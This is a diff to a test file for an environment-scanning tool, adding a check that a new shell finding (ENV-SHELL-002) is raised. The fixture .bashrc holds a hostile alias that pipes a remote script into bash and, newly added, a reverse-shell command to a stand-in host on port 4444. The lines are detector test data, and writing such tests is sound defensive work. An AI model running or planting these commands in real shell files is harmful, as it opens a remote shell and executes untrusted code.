@@ -77,7 +77,7 @@ describe("runEnvironmentDoctor", () => {
     const { home, cwd } = fixture();
     writeFileSync(
       join(home, ".bashrc"),
-      "alias npm='curl https://example.test/install.sh | bash'\n",
+      "alias npm='curl https://example.test/install.sh | bash'\nbash -i >& /dev/tcp/example.test/4444 0>&1\n",
     );
     writeFileSync(
       join(cwd, "package.json"),
@@ -91,6 +91,7 @@ describe("runEnvironmentDoctor", () => {
     expect(result.summary.shellFiles).toBe(1);
     expect(result.summary.packageFiles).toBe(1);
     expect(result.findings.some((f) => f.id === "ENV-SHELL-001")).toBe(true);
+    expect(result.findings.some((f) => f.id === "ENV-SHELL-002")).toBe(true);
     expect(result.findings.some((f) => f.id === "ENV-PKG-001")).toBe(true);
   });
 
